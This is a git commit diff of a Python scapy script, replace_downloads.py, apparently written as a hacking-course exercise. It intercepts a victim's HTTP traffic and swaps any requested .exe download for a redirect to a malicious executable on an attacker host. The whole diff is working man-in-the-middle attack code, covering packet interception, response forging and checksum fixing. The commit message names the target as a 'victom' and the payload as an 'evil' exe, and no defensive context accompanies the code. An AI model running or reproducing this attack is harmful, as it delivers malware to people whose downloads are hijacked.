ecbad62d045e848746f40caaeb41371bac39775c
Evan <erflynn21@gmail.com>
2020-05-12 00:35:07 -0400

    Program now serves up an 'evil' exe file when the victom tries to download a exe file

--- replace_downloads.py
+++ replace_downloads.py
@@ -7,11 +7,19 @@ import scapy.all as scapy
 ack_list = []
 
 
+def set_load(packet, load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+
+
 def process_packet(packet):
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.Raw):
         if scapy_packet[scapy.TCP].dport == 80:
-            if ".zip" in scapy_packet[scapy.Raw].load:
+            if ".exe" in scapy_packet[scapy.Raw].load:
                 print("[+] zip Request")
                 ack_list.append(scapy_packet[scapy.TCP].ack)
 
@@ -19,11 +27,8 @@ def process_packet(packet):
             if scapy_packet[scapy.TCP].seq in ack_list:
                 ack_list.remove(scapy_packet[scapy.TCP].seq)
                 print("[+] Replacing file")
-                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: http://downloadutililab.mysearchguardian.com/releases/wrarulabinstps.exe\n\n"
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(str(scapy_packet))
+                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.7/evil-files/evil.exe\n\n")
+                packet.set_payload(str(modified_packet))
 
     packet.accept()
 
